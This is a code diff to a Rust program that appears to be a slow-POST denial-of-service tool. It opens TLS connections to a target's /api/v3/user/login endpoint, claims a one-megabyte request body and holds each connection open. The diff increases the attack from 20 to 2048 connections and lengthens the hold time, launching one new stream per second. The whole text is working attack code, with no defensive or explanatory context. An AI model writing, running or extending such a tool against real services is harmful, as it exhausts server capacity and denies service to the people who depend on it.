@@ -17,12 +17,14 @@ use tokio_core::reactor::{ Core, Interval };
 fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
-    let timeout = 1;
-    let connections_count = 20;
+    let timeout = 50;
+    let connections_count = 2048;
 
     let mut core = Core::new().unwrap();
     let handle = core.handle();
-    for index in 0..connections_count {
+    let mut index = 0;
+    let runner = Timer::default().interval(Duration::from_secs(1)).for_each(move |_| {
+        if index >= connections_count { return Ok(()) };
         let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\n", host);
         let connector = TlsConnector::builder().unwrap().build().unwrap();
         let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
@@ -36,5 +38,9 @@ fn main() {
             Ok(())
         });
         handle.spawn(timer.map_err(|_| ()));
-    }
+        println!("Stream number: {} spawned.", index);
+        index += 1;
+        Ok(())
+    });
+    core.run(runner);
 }
